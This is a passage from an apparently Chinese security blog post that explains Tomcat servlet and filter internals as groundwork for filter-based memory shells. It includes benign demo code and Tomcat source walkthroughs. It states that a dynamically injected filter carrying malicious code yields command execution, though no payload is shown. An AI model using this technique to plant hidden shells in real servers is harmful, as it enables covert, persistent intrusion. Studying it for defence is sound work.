class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>Main.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>HelloServlet.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-1-servlet初始化流程分析"><a href="#2-3-1-servlet初始化流程分析" class="headerlink" title="2.3.1 servlet初始化流程分析"></a>2.3.1 servlet初始化流程分析</h3><p>我们在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>处下断点调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162053776.png"></p><p>我们尝试按<code>Ctrl+左键</code>追踪它的上层调用位置，但是提示我们找不到，需要按两次<code>Ctrl+Alt+F7</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162215565.png"></p><p>然后就可以看到，上层调用位置位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162319884.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162405771.png"></p><p>接下来我们详细看下面这段代码：<br><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115184354717.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>webxml.getServlets()</code>获取的所有<code>Servlet</code>定义，并建立循环；然后创建一个<code>Wrapper</code>对象，并设置<code>Servlet</code>的加载顺序、是否启用（即获取<code>&lt;/load-on-startup&gt;</code>标签的值）、<code>Servlet</code>的名称等基本属性；接着遍历<code>Servlet</code>的初始化参数并设置到<code>Wrapper</code>中，并处理安全角色引用、将角色和对应链接添加到<code>Wrapper</code>中；如果<code>Servlet</code>定义中包含文件上传配置，则根据配置信息设置<code>MultipartConfigElement</code>；设置<code>Servlet</code>是否支持异步操作；通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p><p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p><p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p><ul><li>创建<code>Wapper</code>对象；</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li><li>设置<code>Servlet</code>的名称；</li><li>设置<code>Servlet</code>的<code>class</code>；</li><li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li><li>将<code>url</code>和<code>servlet</code>类做映射</li></ul><h3 id="2-3-2-servlet装载流程分析"><a href="#2-3-2-servlet装载流程分析" class="headerlink" title="2.3.2 servlet装载流程分析"></a>2.3.2 servlet装载流程分析</h3><p>我们在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code>这里打下断点进行调试，重点关注<code>org.apache.catalina.core.StandardContext#startInternal</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115193750678.png"></p><p>可以看到，装载顺序为<code>Listener</code>–&gt;<code>Filter</code>–&gt;<code>Servlet</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115194704999.png"></p><p>可以看到，上面红框中的代码都调用了<code>org.apache.catalina.core.StandardContext#loadOnStartup</code>，<code>Ctrl+左键</code>跟进该方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                getLogger().error(</span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),</span><br><span class="line">                        StandardWrapper.getRootCause(e));</span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这段代码先是创建一个<code>TreeMap</code>，然后遍历传入的<code>Container</code>数组，将每个<code>Servlet</code>的<code>loadOnStartup</code>值作为键，将对应的<code>Wrapper</code>对象存储在相应的列表中；如果这个<code>loadOnStartup</code>值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个<code>loadOnStartup</code>的升序的顺序来加载。</p><h2 id="2-4-Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#2-4-Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h2><p>开头先明确一点，就是<code>Filter</code>容器是用于对请求和响应进行过滤和处理的，以下这张图是根据<code>Skay</code>师傅文章中的图片重制的：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</a></p></blockquote><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/filter-demo.png"></p><p>从上图可以看出，这个<code>filter</code>就是一个关卡，客户端的请求在经过<code>filter</code>之后才会到<code>Servlet</code>，那么如果我们动态创建一个<code>filter</code>并且将其放在最前面，我们的<code>filter</code>就会最先执行，当我们在<code>filter</code>中添加恶意代码，就可以实现命令执行，形成内存马。</p><p>这些名词其实很容易理解，首先，需要定义过滤器<code>FilterDef</code>，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；然后是<code>FilterDefs</code>，它只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是<code>FilterMaps</code>，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；而<code>FilterChain</code>是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p><h2 id="2-5-编写一个简单的Filter"><a href="#2-5-编写一个简单的Filter" class="headerlink" title="2.5 编写一个简单的Filter"></a>2.5 编写一个简单的Filter</h2><p>我们继续用我们之前在<code>2.2</code>中搭建的环境，添加<code>TestFilter.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter已销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑起来之后，控制台输出<code>[*] Filter初始化创建</code>，当我们访问<code>/test</code>路由的时候，控制台继续输出<code>[*] Filter执行过滤操作</code>，当我们结束<code>tomcat</code>的时候，会触发<code>destroy</code>方法，从而输出<code>[*] Filter已销毁</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116155323191.png"></p><h2 id="2-6-从代码层面分析Filter运行的整体流程"><a href="#2-6-从代码层面分析Filter运行的整体流程" class="headerlink" title="2.6 从代码层面分析Filter运行的整体流程"></a>2.6 从代码层面分析Filter运行的整体流程</h2><p>我们在上面的<code>demo</code>中的<code>doFilter</code>函数这里下断点进行调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116180329213.png"></p><p>跟进<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>继续跟进变量<code>filterChain</code>，找到定义处的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117003245011.png"></p><p>查看该方法（<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request)request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">        FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">        <span class="keyword">if</span> (filterMaps != <span class="literal">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType)request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (attribute != <span class="literal">null</span>) &#123;</span><br><span class="line">                requestPath = attribute.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line">            FilterMap[] var10 = filterMaps;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> filterMaps.length;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> var12;</span><br><span class="line">            FilterMap filterMap;</span><br><span class="line">            ApplicationFilterConfig filterConfig;</span><br><span class="line">            <span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                